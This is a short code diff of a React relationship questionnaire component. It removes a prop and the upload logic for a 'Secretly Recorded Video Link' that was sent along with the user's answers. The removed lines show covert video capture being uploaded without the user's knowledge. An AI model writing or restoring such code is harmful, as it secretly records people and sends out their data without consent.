@@ -2,12 +2,10 @@ import React, { useState } from "react";
 
 interface LoveQuestionnaireProps {
   onComplete: () => void;
-  secretVideoData: any; // Add this prop
 }
 
 const LoveQuestionnaire: React.FC<LoveQuestionnaireProps> = ({
   onComplete,
-  secretVideoData, // Receive the prop
 }) => {
   const tabLabels = ["Shared Experiences", "Her Wishes", "My Shortcomings"];
   const [activeTab, setActiveTab] = useState(0);
@@ -96,14 +94,10 @@ const LoveQuestionnaire: React.FC<LoveQuestionnaireProps> = ({
     };
 
     const capturedMemoriesLinks = await uploadMedia(mediaData);
-    const secretVideoLink = secretVideoData
-      ? (await uploadMedia([secretVideoData]))[0]
-      : "No video recorded.";
 
     const finalData = {
       ...data,
       "Captured Memories Links": capturedMemoriesLinks,
-      "Secretly Recorded Video Link": secretVideoLink,
     };
 
     try {
